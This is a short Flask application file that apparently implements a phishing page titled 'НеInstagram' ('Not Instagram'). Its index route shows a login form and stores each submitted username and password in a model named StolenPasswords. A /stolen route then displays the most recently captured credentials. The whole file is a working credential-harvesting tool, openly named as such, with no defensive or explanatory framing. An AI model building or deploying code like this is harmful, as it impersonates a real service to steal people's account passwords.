from flask import render_template, redirect, url_for
from app import app
from app.forms import LoginForm
from app.models import StolenPasswords
from app import db

@app.route('/', methods=['GET', 'POST'])
def index():
	form = LoginForm()
	stolen = StolenPasswords()
	if form.validate_on_submit():
		stolen.username = form.login.data
		stolen.password = form.password.data
		db.session.add(stolen)
		db.session.commit()
		return redirect(url_for('stolen'))
	return render_template('main.html', title='НеInstagram', form=form)


@app.route('/stolen')
def stolen():
	user = StolenPasswords.query.all()[-1]
	return render_template('index.html', user=user)
